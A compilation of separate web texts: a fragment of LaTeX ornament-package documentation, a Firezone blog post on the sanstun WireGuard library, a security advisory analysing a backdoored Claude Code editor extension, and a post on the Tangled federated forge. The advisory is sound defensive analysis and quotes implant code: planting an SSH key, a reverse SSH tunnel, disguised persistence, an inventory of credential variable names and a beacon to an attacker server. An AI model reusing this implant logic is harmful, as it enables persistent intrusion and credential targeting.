% novisitors (no butterflies, bees, snails or birds); for both: theme=geometric or theme=math,
% density=0.4 (grown only), intensity=0.6
% two-sided? nothing to set: the garden grows in the wider side margin
\definecolor{ink}{HTML}{5B2A1F}      % optional: the hue of the whole palette (this is sepia)
\definecolor{accent}{HTML}{B4662F}   % optional: the copper of the hairlines
...
\florilegiuminitial[4]{T}his paragraph starts with a decorated T.
... a flower in the margin beside this line\florilegiumbloom ...
\florilegiumage{0.8}                 % grown only: autumn from here on
\florilegiumtheme{geometric}         % another theme, from the page this stands on
\florilegiumornament{leaf}           % one leaf in the text, the size of a letter
\florilegiumtextend                  % grown only: at the very end of the text
A fixed seed instead of the page number: lualatex "\def\florilegiumseed{7}\input{florilegium-grow.tex}".
Any primitive can be drawn on its own inside a TikZ picture, under the current scope's shift, rotation and scale:
\begin{tikzpicture}
  \begin{scope}[shift={(2,2)},rotate=20]\florilegiumdraw{flower}{1.3}\end{scope}
  \begin{scope}[shift={(5,0)}]\florilegiumdraw{leaf}{3.0, {depth=0.6}}\end{scope}
  \begin{scope}[shift={(8,1)}]\florilegiumdraw{ghost}{"lily", {s=1.4}}\end{scope}
  \begin{scope}[shift={(11,1)}]\florilegiumdraw{butterfly}{1.5}\end{scope}
\end{tikzpicture}
With a theme, its primitives can be drawn by name too: \florilegiumdraw{crystal}{1.0} under theme=geometric (see specimen-geometric.tex), \florilegiumdraw{knot}{1.2} under theme=math.
How it works
Drawing (ink.lua). All geometry is computed in Lua and written as PDF path operators into one literal node per page; TeX does no arithmetic. Primitives are drawn in a local frame under an affine transform, which is read from TikZ when a primitive is called inside a scope. Colors come from a tone ramp derived from the one document color ink: navy to mist at the hue of ink, interpolated in OKLCH so the light end stays blue instead of turning gray. Tapered strokes are two offset Béziers, not sampled ribbons.
Primitives (flora.lua). Painted in the order a watercolor

title: Introducing sanstun: sans-IO WireGuard | Firezone Blog
content:
Thomas Eizinger
October 31, 2026
Introducing sanstun: A sans-IO, parallel-friendly, userspace WireGuard implementation in Rust
Today, we are announcing sanstun: a sans-IO Rust implementation of the WireGuard® state machine, optimized for ease of use, security and performance through a parallel-friendly and idiomatic API.
What is sans-IO?
sans-IO is the idea that you design your system such that IO and side-effects are cleanly separated from the state and "business logic". The IO in sans-IO doesn't just mean file or network IO. It also includes things like time and randomness!
Due to their lack of side-effects, sans-IO components compose very well and are relatively easy to test. The design also avoids problems like function coloring and plays well with Rust's ownership rules.
The code examples and references in this post are in Rust but sans-IO isn't Rust-specific at all. Its patterns and ideas can be applied in any language. For a more in-depth explanation, our sans-IO post is a good place to start.
History
When we first built Firezone, we reached for boringtun as our WireGuard implementation. boringtun more or less did what we wanted, but over time, we found ourselves patching our fork over and over with bug fixes as well as API additions. The goal was to allow these patches to still be upstreamed, so we always kept the existing API working the way it was.
What we found was that retaining 100% API compatibility with upstream was increasingly difficult as our product requirements evolved. One of the first big changes we made to boringtun was to make it fully sans-IO with regard to time handling (firezone/boringtun#5). This meant adding new APIs for everything with a _at suffix that would take an Instant. sans-IO time handling is very important if you want to accurately simulate an entire system. See this blog post to learn more about how we do that.
Another thing we feature-flagged was internal buffering. At first, it seems convenient that boringtun establishes a session automatically if you don't have one yet (or anymore) and you are trying to send a packet. Internal buffering, however, comes with several problems:
At some point, the buffer needs to be drained. boringtun solves this by requiring you to call decapsulate with a zero-length datagram. Rather unintuitive.
It incurs additional allocations (at least in the way it was implemented in boringtun).
Buffer sizes should be configurable / tunable.
All of these problems point at the same solution: Just don't buffer in the library. It simplifies the interface and the implementation on both sides.
The full list of patches and fixes is pretty long. Even excluding dependency bumps, that is more than 70 PRs. Several of them are fixes for edge-cases we discovered. Others add new APIs or make certain aspects configurable.
After more than 2 years of using and patching boringtun, we had a pretty good idea of what the overall API of a userspace WireGuard implementation should be. Now it exists as sanstun.
A better sans-IO API
The core building blocks of the sans-IO API are now:
Handling inbound packets:
Tunnel::handle_handshake_initiation
Tunnel::handle_handshake_response
Tunnel::handle_cookie_reply
Tunnel::begin_decapsulate & Tunnel::commit_decapsulate
Handling outbound packets: Tunnel::begin_encapsulate
Handling timer updates: Tunnel::handle_timeout & Tunnel::poll_timeout
Handling events: Tunnel::poll_event
Without internal buffering, there is no API contract that requires you to call certain APIs in a loop, which fits much better into the overall sans-IO model. To send a packet, you call Tunnel::begin_encapsulate. It is up to you to buffer the packet if you don't have a session yet. Creating a new session means sending a handshake. You can initiate a new handshake at any point with Tunnel::initiate_handshake.
The design of these APIs is very deliberate and will make more sense if we quickly recap the WireGuard protocol.
WireGuard protocol
WireGuard's message format supports 4 types of messages: handshake init, handshake response, cookie reply and encrypted data.
Every WireGuard session starts with a Diffie-Hellman key exchange which is a moderately expensive operation. WireGuard's design ensures that exposing an endpoint doesn't open up a DoS opportunity.
Anyone who knows the endpoint's public key can easily create bogus handshake initiations and forge the source IP of the incoming UDP packet. The receiving WireGuard implementation has to run its half of the DH operations before it can tell that the supplied handshake data is bogus. But at that point, the CPU resources have already been spent. Send enough handshake initiations and the receiving end will spend all its CPU cycles on handling irrelevant handshakes.
To prevent this, WireGuard specifies a cookie mechanism that forces the remote to prove ownership of its claimed source IP, which in turn allows rate-limiting handshakes per source IP.
These rate limits apply to an entire WireGuard interface and not just to a single tunnel.
Once a handshake has been completed, both peers can exchange encrypted data packets with a symmetric cipher. As part of the handshake, the peers also exchange their locally-chosen session indices. These indices enable de-multiplexing of tunnels as well as multiple sessions within a tunnel.
Mapping protocol invariants to API design
If you are working in a language like Rust, chances are you enjoy using types. And using types well means enforcing invariants at compile-time such that you can't even ship a certain bug in the first place. For example, forgetting to apply the rate limiter to a message would be pretty bad because it doesn't show up under normal operation. Similarly, routing an incoming packet to the wrong tunnel is something that will only show up in production.
A good API design makes it impossible to build things that are broken and also guides you along in understanding how the protocol works.
One interface, many tunnels
A WireGuard interface is identified by a single key and a tunnel is a connection between two interfaces. Any time we want to send a packet, we therefore need to specify which tunnel it should be sent on and when we receive a packet, we need to figure out which tunnel it belongs to.
In sanstun, these concepts directly map to the Interface and Tunnel types. All inbound packets go through Interface::receive. That is the only public API that parses a raw datagram. It parses the packet, applies rate limits and hands you back a ReceivedMessage with one enum variant per WireGuard message type, or a cookie reply to send back if the interface is under load. These then map directly to the corresponding functions on a Tunnel: Tunnel::handle_handshake_initiation, etc. Handshake initiations are routed by the initiator's static public key. All other messages expose which Tunnel they should be dispatched to, identified by a TunnelId.

Every inbound datagram has to go through Interface::receive.
Under the hood, sanstun does a lot of things for you here. It parses the tunnel index and extracts the upper 24 bits, it applies rate limits, generates cookie replies and validates handshake messages.
Crucially, the constructors for types like HandshakeInitiation are all crate-private. Even though Tunnel exposes a public handle_handshake_initiation function, the only way to call that is by going through Interface::receive first to obtain such a type. And Interface::receive protects your application by applying the rate limiter, all without you having to think about it.
Parallel crypto
One of the best features of sanstun is its parallel-friendly API for encrypting and decrypting packets.
On a protocol level, WireGuard doesn't share any state between tunnels. Therefore, parallelizing a WireGuard implementation across peers is very easy.
But what about parallelizing work within a single tunnel? WireGuard operates on layer 3, and thus a single session with another peer carries the traffic of many individual network flows. Even if we handle tunnels to different peers on different threads, all network flows (i.e., unique 5-tuples) toward the same host or subnet will be processed sequentially, effectively bounded by how fast the CPU is at ChaCha20-Poly1305, WireGuard's cipher for data packets. To protect against replay by malicious on-path observers, WireGuard data packets have a monotonically increasing packet counter. This counter is scoped to a single session and therefore would require synchronization if we were to access this state from multiple threads simultaneously.
To avoid this, sanstun separates the bookkeeping from the actual encryption and decryption. Calling Tunnel::begin_encapsulate doesn't in fact encrypt anything. It checks for the current session, reserves a packet counter, advances timer state and then hands you a PendingEncapsulate:
impl PendingEncapsulate {
    pub fn encrypt<'a>(self, plaintext: &[u8], dst: &'a mut [u8]) -> Result<DataMessage<'a>, Error> {
        // ...
    }
}
PendingEncapsulate implements Send and can thus be transferred to another thread to perform the bulk of the work. Running cargo bench data_path in the sanstun repository showcases the effect of this split:
data_path/64B/begin_encapsulate
                        time:   [20.785 ns 20.828 ns 20.869 ns]
data_path/64B/encrypt   time:   [226.15 ns 226.22 ns 226.29 ns]
data_path/64B/begin_decapsulate
                        time:   [37.600 ns 37.675 ns 37.744 ns]
data_path/64B/decrypt   time:   [205.78 ns 205.83 ns 205.87 ns]
data_path/64B/commit_decapsulate
                        time:   [17.486 ns 17.529 ns 17.575 ns]

data_path/1280B/begin_encapsulate
                        time:   [20.785 ns 20.828 ns 20.869 ns]
data_path/1280B/encrypt time:   [933.49 ns 933.54 ns 933.59 ns]
data_path/1280B/begin_decapsulate
                        time:   [37.606 ns 37.681 ns 37.751 ns]
data_path/1280B/decrypt time:   [914.81 ns 914.89 ns 914.97 ns]
data_path/1280B/commit_decapsulate
                        time:   [17.657 ns 17.707 ns 17.764 ns]
As expected, the bookkeeping parts (begin_encapsulate, begin_decapsulate and commit_decapsulate) do not scale with packet size. What does scale with packet size are the encrypt and decrypt functions. At a packet size of 1280 bytes, the bookkeeping part of encrypting a new packet is only 2%. If we move the actual encryption to another thread, this hints at a potential speedup of more than 45x!
An effective speedup of 45x is hard to achieve in practice because it ignores the cost of passing PendingEncapsulate to another thread and assumes no other overhead is introduced. Nevertheless, being able to offload the crypto to worker threads allows for some great throughput improvements.

The owner thread only does the bookkeeping, while encryption and decryption run on worker threads.
Being a sans-IO library, sanstun doesn't concern itself with how exactly you want to parallelize your crypto. If you want to keep it simple, you can also just call encrypt and decrypt inline and not bother with parallelization at all.
The key thing we wanted to achieve with sanstun's API design was to enable parallel crypto while keeping everything around Interface single-threaded. This lets the internal rate limiter work without locks or atomic counters and take advantage of Rust's borrow checker, all while combining state from multiple tunnels.
Closing
With sanstun, our fork at firezone/boringtun is now deprecated. If you are building on top of WireGuard, whether that's a VPN, a mesh network or something else entirely, we hope sanstun makes your life a little easier. It is available on crates.io.
sanstun is open source under the Apache 2.0 license. Check it out on GitHub; issues and pull requests are welcome!

title: Official Claude Code Extension Compromise: Security Advisory | Phorion
content:
October 30, 2026
Updated October 31, 2026
By Calum Hall
Official Claude Code Extension Compromise: Security Advisory
SSH Backdoor
Cursor Marketplace
VS Code
macOS
Linux
Windows
Threat Report
TL;DR
Phorion has detected a backdoor in the official Claude Code for VS Code extension bundle on the Cursor Marketplace that drops a persistent SSH backdoor across macOS, Linux, and Windows. This write-up focuses primarily on macOS, where the extension attempts to configure an SSH backdoor and establish persistence.
Organisations should immediately review their environments for use of Claude Code for VSCode 2.1.312 or 2.1.313 and engage incident response where use of the extension is discovered.
Update (31 October 2026): Cursor’s security notice now identifies versions 2.1.312 and 2.1.313 distributed through the Cursor Marketplace for macOS and Windows as affected. This advisory previously identified only 2.1.313; the affected-version guidance below has been updated accordingly.
Phorion has discovered a compromise of the official Claude Code for VS Code extension on the Cursor Marketplace, where the backdoored extension bundle contains a persistent Secure Shell (SSH) backdoor. Cursor has removed the affected versions, 2.1.312 and 2.1.313, from its marketplace.
While the implant includes setup and persistence logic for macOS, Linux, and Windows, we’re going to focus primarily on macOS in this post, calling out the key differences and a few implementation bugs on the other platforms along the way.
The Cursor Marketplace serves extensions for the Cursor editor. Because extensions run with the permissions of the IDE and the user running it, a backdoored extension gets immediate access to local files, source code, and developer tooling as soon as its module is loaded.
Notably, Phorion has discovered a likely oversight in how the malware tries to turn on SSH. The setup logic assumes it can check the current Remote Login state without root privileges. When run as a standard user, systemsetup -getremotelogin prints an administrator-access error and exits with status 0 instead of returning Off. Because the script only tries to enable SSH if the output matches Off, it skips the enablement step entirely. On a Mac that doesn’t already have SSH running, that mistake breaks the inbound access path, even though the SSH keys and persistence still get dropped.
In this post, we’ll walk through how the backdoor works, why that macOS check fails, and what to look for across your fleet. The goal of this payload is long-term interactive access, and whilst the SSH backdoor bug minimises impact on macOS, the malware is still a significant threat that installs persistence and beacons host reconnaissance back to the operator.
Infection Chain
The Cursor Marketplace Extension
The compromised extension.js file starts with an injected immediately invoked function expression (IIFE) prepended to the minified extension bundle. The rest of the bundle looks like the standard extension, with Claude Code and VS Code strings, normal activate and deactivate exports, and UI code.
The injected prefix pulls in standard Node.js modules (child_process, fs, os, path, http, and crypto) and executes as soon as Node loads the file, before the extension’s normal activate callback even runs. The user doesn’t need to interact with the extension for the payload to fire.
Stage 1 - Preparing SSH Access
First, the payload makes sure ~/.ssh exists and appends an attacker-controlled Ed25519 public key to ~/.ssh/authorized_keys, setting permissions to 0700 on the directory and 0600 on the file.
The key uses the comment svc-telemetry. Before appending, the script checks whether svc-telemetry is already in the file rather than checking for the key itself. When hunting for this activity, it’s worth checking the public-key fingerprint rather than relying solely on the comment string.
var sd = path.join(HOME, ".ssh"),
    ak = path.join(sd, "authorized_keys");
// ...
if (cur.indexOf("svc-telemetry") < 0) {
  fs.appendFileSync(ak, PUB + "\n");
  d.sshKey = "added"
} else {
  d.sshKey = "present"
}
Here, cur holds the existing contents of authorized_keys, and PUB is the embedded attacker public key (redacted here).
With the key in place, anyone holding the matching private key can authenticate as that user, provided SSH is actually running. The next step in the script tries to make sure the local SSH daemon is enabled and listening:
Linux: tries to enable and start sshd or ssh via systemctl, falling back to service and /etc/init.d/.
macOS: checks Remote Login and, if it reports Off, tries to enable it via sudo -n systemsetup -setremotelogin on.
Windows: tries to install and start OpenSSH Server using PowerShell.
None of these steps include a privilege escalation exploit. Non-interactive sudo -n will fail unless the user already has passwordless sudo cached or configured, so starting a system service won’t always succeed from a standard user context.
It looks like the Windows code path also has its own bug: it passes the PowerShell service setup command through a helper function (det()) that hardcodes /bin/sh, which isn’t going to get very far on a standard Windows install.
A bug in the macOS SSH logic?
On macOS, the setup may run into problems before it even gets to the sudo command. The script runs systemsetup -getremotelogin without elevation and tests the output against /Off/i. It only tries to enable Remote Login if the output contains Off:
// ...
else if (PLAT === "darwin") {
  var rl = ex("systemsetup -getremotelogin 2>/dev/null", 4000);
  d.remoteLogin = rl;
  if (/Off/i.test(rl)) {
    det("sudo -n systemsetup -setremotelogin on >/dev/null 2>&1");
    d.remoteLoginOn = "tried"
  }
}
Notice that the second command (-setremotelogin on) uses sudo -n, while the first command (-getremotelogin) doesn’t. When you run systemsetup -getremotelogin as a standard user on macOS, you get this instead:
You need administrator access to run this tool... exiting!
systemsetup refuses to read the setting without administrator privileges, prints the error to stdout, and exits with status 0. The malware’s ex() helper grabs stdout and returns it:
function ex(c, t) {
  try {
    return cp.execSync(c, {
      timeout: t || 3000,
      stdio: ["ignore", "pipe", "ignore"],
      windowsHide: true
    }).toString().trim()
  } catch (e) {
    return ""
  }
}
Because the output is "You need administrator access to run this tool... exiting!", /Off/i.test(rl) evaluates to false.
As a result, the script skips the if block and never runs sudo -n systemsetup -setremotelogin on. It effectively treats “I don’t have permission to check if SSH is off” as “SSH is already on”, which also explains why you won’t see the enablement attempt in process telemetry when the extension runs as a normal user.
This bug can break the final step of the access chain. If Remote Login isn’t already enabled on the Mac, the outbound tunnel can still connect to the attacker’s server, but any traffic forwarded back through the tunnel will hit a closed port 22 on localhost.
Of course, that isn’t something to rely on as a defence. If the user already had Remote Login enabled, or turns it on later, the backdoor is ready and waiting.
Stage 2 - Establishing the Reverse SSH Tunnel
Next, the script sets up an outbound SSH connection to 134.209.82[.]225 as the tunnel user on port 22. To authenticate to the attacker’s server, it decodes a separate embedded private key: an unencrypted OpenSSH Ed25519 key with the comment svc-telemetry-tun.
It’s worth keeping the two keys straight during an investigation:
The public key added to ~/.ssh/authorized_keys (svc-telemetry) lets the attacker log into the victim’s machine.
The embedded private key (svc-telemetry-tun) lets the victim’s machine connect out to the attacker’s tunnel server.
The script writes this tunnel key to the OS temporary directory with a filename starting with .stk_, followed by the first ten characters of the MD5 hash of the hostname and home directory path:
var kf = path.join(
  TMP,
  ".stk_" + crypto.createHash("md5")
    .update(String(os.hostname()) + HOME).digest("hex").slice(0, 10)
);
// ...
var RF = (PLAT === "win32") ? "\"*:0:localhost:22\"" : "'*:0:localhost:22'";
The tunnel uses -R *:0:localhost:22 for remote port forwarding. Passing 0 asks the attacker’s SSH server to dynamically allocate a listening port and forward any traffic hitting it back through the tunnel to localhost:22 on the victim’s machine:
Affected host -- outbound SSH tunnel --> External SSH server
Operator -- separate connection --> Server's allocated port
                                            |
                                 Through the existing tunnel
                                            |
                                            v
                                  Affected host's SSH:22
                                            |
                                  Login using the planted key
Because the tunnel runs with -N, it just holds the port forward open without executing a command on the remote server. When the operator wants to access the machine, they start a separate SSH session through the allocated port on their server, authenticating against the victim’s local SSH daemon using the key planted in Stage 1. That gives them a full interactive shell and file transfer capability without needing any custom C2 command handling in the JavaScript itself.
The SSH command also passes flags to keep the connection quiet and non-interactive: host-key checking is disabled, known_hosts is ignored, BatchMode and IdentitiesOnly are enabled, keepalives are set to 30 seconds (ServerAliveCountMax=3), and ExitOnForwardFailure is turned on.
If autossh is installed, the script uses it; otherwise it falls back to standard ssh. It wraps the connection in a detached retry loop that sleeps for 60 seconds between attempts, using pgrep on Unix systems to avoid spinning up duplicate initial tunnels. Because the loop is detached, the tunnel stays up even after the user closes their IDE.
Stage 3 - Keeping Access Available
To survive a reboot, the script sets up platform-specific persistence alongside the initial detached tunnel:
PLATFORM ARTIFACTS PERSISTENCE MECHANISM NOTES
Linux ~/.config/.smt, ~/.config/.smtk Writes a shell script that recreates the tunnel key and loops the SSH connection, then adds an @reboot entry to the user’s crontab. Contains a bug in the crontab check that can wipe existing user cron jobs on repeat runs (detailed below).
macOS ~/.config/.smt, ~/.config/.smtk, ~/Library/LaunchAgents/com.apple.sysmond.plist Writes a user LaunchAgent that runs /bin/sh ~/.config/.smt with RunAtLoad and KeepAlive set to true, then loads it via launchctl. Runs in the user context rather than as a root LaunchDaemon.
Windows ~/.config/smt.cmd, ~/.config/smtk, %APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/sysmon.cmd Tries to create a scheduled task named SysMon running as SYSTEM on startup. If that fails, drops sysmon.cmd into the user’s Startup folder. Creating a SYSTEM task requires admin privileges; the Startup folder fallback runs as the user at login.
On macOS and Linux, the ~/.config/.smt script has the tunnel private key embedded inside it and writes it out to ~/.config/.smtk before starting the reconnection loop.
On macOS, the LaunchAgent disguises itself as com.apple.sysmond.plist inside ~/Library/LaunchAgents/:
<key>Label</key>
<string>com.apple.sysmond</string>
<!-- ... -->
<key>RunAtLoad</key>
<true/>
<key>KeepAlive</key>
<true/>
Stage 4 - Host Recon
Finally, the script gathers basic host reconnaissance and sends a one-off beacon back to the attacker’s server:
Hostname, username, OS platform, and architecture
Home directory, current working directory, and global Git email (git config --global user.email)
Public IP address and status flags from each setup stage (e.g. whether the SSH key was added and which persistence method ran)
Up to 40 environment variable names (not values) matching /KEY|TOKEN|SECRET|PASS|AWS|GCP/i
The environment variable check uses Object.keys(process.env):
Object.keys(process.env)
  .filter(function(k) {
    return /KEY|TOKEN|SECRET|PASS|AWS|GCP/i.test(k)
  })
  .slice(0, 40)
Because it only grabs the variable names, the beacon doesn’t exfiltrate the secret values themselves. Instead, it gives the operator a quick inventory of which cloud credentials or API tokens live on the machine so they know which hosts to prioritise.
To get the machine’s public IP, the script queries ifconfig[.]me, falling back to api[.]ipify[.]org.
It then sends the JSON report via plaintext HTTP POST requests to /beacon on both 134.209.82[.]225:8099 and 127.0.0.1:8099:
var r = http.request({
  host: h,
  port: p,
  path: "/beacon",
  method: "POST",
  timeout: 3000,
  headers: {"content-type": "application/json"}
}, function(res) {
  res.resume()
});
// ...
r.write(JSON.stringify(d));
r.end()
Why it also sends a copy of the beacon to 127.0.0.1:8099 isn’t clear from the sample; the script itself doesn’t set up a local listener on that port.
The beacon is scheduled once with setTimeout (1.5 seconds after the initial setup runs) and discards any HTTP response with res.resume(). It’s purely a check-in to let the operator know the host is ready, while the SSH tunnel handles the actual access.
Detection Opportunities
From a detection standpoint, there are several behaviours in this chain that stand out on macOS using Endpoint Security Framework (ESF) telemetry.
SSH Key and Configuration Changes
Because the malware appends to ~/.ssh/authorized_keys directly using Node’s fs.appendFileSync, process-only rules watching for shell commands like echo or tee touching authorized_keys won’t catch it. This is where file modification telemetry is essential: watching for IDE helper processes (Code Helper, Cursor Helper, etc.) creating or writing to ~/.ssh/authorized_keys.
Even though the IDE binary itself is validly signed, its extension host process has no business modifying SSH authentication files in the background.
While you should also monitor for systemsetup -setremotelogin on, don’t rely on it as a required condition for alerting on this campaign. As we saw above, the broken state check on macOS means that command often won’t run at all.
User LaunchAgent Persistence
The persistence setup on macOS gives us a couple of strong signals:
A non-Apple process writing a plist with a com.apple.* label (~/Library/LaunchAgents/com.apple.sysmond.plist).
A LaunchAgent configured to execute /bin/sh against a hidden script in the user’s home directory (~/.config/.smt).
Because the initial tunnel is spawned as a detached process and launchd later manages .smt directly, the subsequent ssh processes won’t have the IDE as their immediate parent in a live process tree. Correlating the file creation of .smt and com.apple.sysmond.plist back to the IDE extension host makes it much easier to piece the chain together.
SSH Tunnel

title: The federated code forge · The Tangled Blog
content:
The federated code forge
Anirudh
30 October 2026
For most of the past two decades, the code forge has been where projects live: where code is hosted, where changes are reviewed, and where contributors find each other. Forges offered convenience in exchange for centralisation.
But the centralised forge is crumbling. Relying on someone else for uptime, for features, and to be a good steward of your code hasn’t played out well. What has stood the test of time is email: Git to move the code, and email — an open protocol — to talk about it. At the cost of user experience, however.
Tangled aims to give you the best of both: the longevity of an open protocol, with the convenience and polish of a proper forge.
It’s the first truly federated code forge — you can host code on your own servers and still collaborate seamlessly with others. Our approach is pragmatic: self-host just the parts you want, like Git hosting or CI runners, or all of it, including the API server and UI. Whatever you choose, you can still talk to everyone else.
Owning your infrastructure also means you can hack on, extend and customise your forge as you see fit. Because Tangled is built on the AT Protocol, you can build your own extensions, subscribe to the firehose, or even write entirely custom knots, like this one that runs on Cloudflare Workers and uses their Artifacts product for git storage. Or an entirely custom spindle such as mitchellh.com/tack. Go even further and host our ultralight API server and build your own custom forge.
Agents have made building such hyper-personalized software trivial, and especially so when software is designed with hackability in mind from the get-go. Tangled is incredibly agent friendly.
The future of software engineering may be a moving target, but our bets on open protocols and developer agency give us the agility to move with it, and to become your code forge for the next decade.
Product updates
A fresh look!
The obvious big one: with this release, Tangled has a whole new look. We’ve redone the UI on top of our new architecture (described further below), in Svelte. Things should now be quicker, visually consistent and prettier! The keen eyed of you might’ve also spotted that we’ve swapped out Inter for Timeless Sans.
A bobbin near you
Until now, Tangled’s web UI and backend were a single Go monolith called the appview. The appview service handled AT Protocol indexing, caching, off-protocol data and UI rendering using html/template + htmx. It ran on a single SQLite database on one medium-sized server in Sweden.
This was great as long as you were ~50–100 ms away from Sweden, but most of our users aren’t! We rearchitected: we built a new standalone frontend app in Svelte, deployed at the edge. It is populated by our new diskless, entirely in-memory indexer service written in Rust: bobbin. Bobbins are deployed globally in over 11+ regions, ensuring users around the world get the best API and UI performance.
The astute reader might’ve noticed: bobbin is purely read-only and only deals with AT Protocol data. What of the rest? That functionality (and more) has been delegated to a new set of supporting services.
The new data model and repo-owned data
First, the data model itself: we have a new set of lexicons, and everything now lives under org.tangled.*, replacing the old sh.tangled.* records.
Knot2 is our aptly named, second implementation of the knot server, this time rewritten in Rust. Knot2 bakes a fully custom Git server, and also bundles in an SSH server in the same binary.
With knot2, we’ve also changed where some of that data lives. Issues, pull requests, comments, reactions and labels are now stored on the knot, right next to the code, as collaborative objects (COBs). A COB is just a chain of Git objects in the repo itself. Collaborators, knot members and the blocklist are also stored the same way.
In that sense, knots now behave a lot like a PDS: they hold signed records, full history included, for everything that belongs to a repo and much like a PDS, these records are synced via the standard AT Protocol firehose.
But why? A project’s issues and pull requests are as much a part of it as its code, so they should live with it, wherever you choose to host it. This gives your project maximum portability.
If the knot writes your issues and comments, what stops it from putting words in your mouth? Attestations. Every time you create or edit a record on a knot, the web app also writes an org.tangled.graph.attestation record to your own PDS, pointing at that exact version of the record and the COB change behind it. Two-way verification!
Self-hosters will have to upgrade their knots to the v1.20.0 by following the upgrade guide.
Organizations
Organization accounts are here! An Organization on Tangled is a real AT Protocol account, with its own DID and handle, hosted on a Tranquil PDS instance. They’re passwordless, delegated accounts: you create one from the New Organization page, and you get <name>.tngl.sh with yourself as its owner. Owners can invite members, and anyone in the Organization can act as it when creating or forking repositories. Like any other account, you can swap the handle out for a domain you own. If you’ve been running a regular account as a stand-in “org”, hang tight — we’re working on a way to move those over. Read more in the docs.
Stacked PRs for everyone
Our PR flow has been overhauled. The new flow gives everyone, regardless of whether you use Jujutsu or just vanilla Git, the ability to submit and review stacked PRs. If you’re using Git, you now get the ability to interdiff between versions (previously called rounds). JJ users get to interdiff between individual changes as well.
Launch weeks ahead
This isn’t all. We’re staggering this launch across the next few weeks. Up next are private repos, a CLI, SDKs for different languages and skills for your agent.
Until then, enjoy every part of this launch equally.
